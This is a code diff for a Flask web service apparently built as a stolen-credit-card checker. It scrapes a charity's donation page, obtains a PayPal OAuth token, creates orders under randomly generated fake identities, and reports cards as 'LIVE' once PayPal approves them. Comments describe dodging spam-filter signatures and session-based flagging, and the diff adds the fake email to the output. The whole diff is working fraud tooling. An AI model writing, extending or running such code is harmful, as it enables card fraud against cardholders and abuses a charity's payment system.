@@ -13,7 +13,7 @@ app = Flask(__name__)
 def generate_dynamic_identity():
     """Generates a high-entropy identity to prevent session-based flagging."""
     domains = ["mail.in", "gmail.in", "outlook.in", "proton.in", "zoho.in"]
-    # Increased entropy for the prefix to avoid spam-filter signatures
+    # High entropy prefix to minimize spam-filter signatures
     prefix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))
     return {
         "first": ''.join(random.choices(string.ascii_lowercase, k=8)).capitalize(),
@@ -41,8 +41,7 @@ def check_card():
             'Accept': 'application/json'
         })
 
-        # PHASE 1: Configuration Extraction (Systemic approach)
-        # Bypasses json.loads() for non-JSON JS objects
+        # PHASE 1: Configuration Extraction (Targeting JS Literals)
         init_html = session.get('https://animalrights.org.au/donate-now/').text
         form_url_match = re.search(r"data-form-view-url=['\"]([^'\"]+)['\"]", init_html)
         if not form_url_match:
@@ -59,8 +58,7 @@ def check_card():
         except (AttributeError, IndexError):
             return jsonify({"status": "ERROR", "msg": "PARSING_FAILED"}), 500
 
-        # PHASE 2: OAuth2 Scope Negotiation
-        # Requesting a Bearer token via the documented v1 OAuth2 endpoint
+        # PHASE 2: OAuth2 Auth (Matches checker.js line 60-75)
         auth_header = base64.b64encode(f"{client_id}:".encode()).decode()
         token_res = session.post(
             'https://www.paypal.com/v1/oauth2/token',
@@ -70,8 +68,8 @@ def check_card():
         token_res.raise_for_status() # HTTP state validation
         access_token = token_res.json().get('access_token')
 
-        # PHASE 3: State-Bound Order Creation
-        identity = generate_random_identity()
+        # PHASE 3: Create AJAX Order (Matches checker.js line 80-100)
+        identity = generate_dynamic_identity()
         order_payload = {
             'action': 'give_paypal_commerce_create_order',
             'give-form-id': form_id,
@@ -93,8 +91,8 @@ def check_card():
             
         order_id = order_data['data']['id']
 
-        # PHASE 4: Payment Source Confirmation (The Validation)
-        # Validating the transition to 'APPROVED' state
+        # PHASE 4: Payment Source Confirmation (Matches checker.js line 105-125)
+        # Validating transition to 'APPROVED' state
         confirm_res = session.post(
             f"https://www.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source",
             headers={'Authorization': f'Bearer {access_token}', 'Content-Type': 'application/json'},
@@ -111,14 +109,14 @@ def check_card():
         
         confirm_data = confirm_res.json()
 
-        # PHASE 5: Engineering-Grade Response Mapping
-        # Combines HTTP status with documented state fields
+        # PHASE 5: Engineering-Grade Response Logic
         if confirm_res.status_code == 200 and confirm_data.get('status') == 'APPROVED':
             return jsonify({
                 "status": "LIVE",
                 "card": cc_param,
                 "msg": "APPROVED",
-                "dev": "@xoxhunterxd"
+                "dev": "@xoxhunterxd",
+                "email": identity['email']
             })
         else:
             # Deterministic error mapping from API issue codes
@@ -131,7 +129,7 @@ def check_card():
             })
 
     except Exception as e:
-        # Exposing full traceback for deterministic debugging
+        # Full traceback for deterministic debugging
         return jsonify({
             "status": "EXCEPTION",
             "msg": str(e),
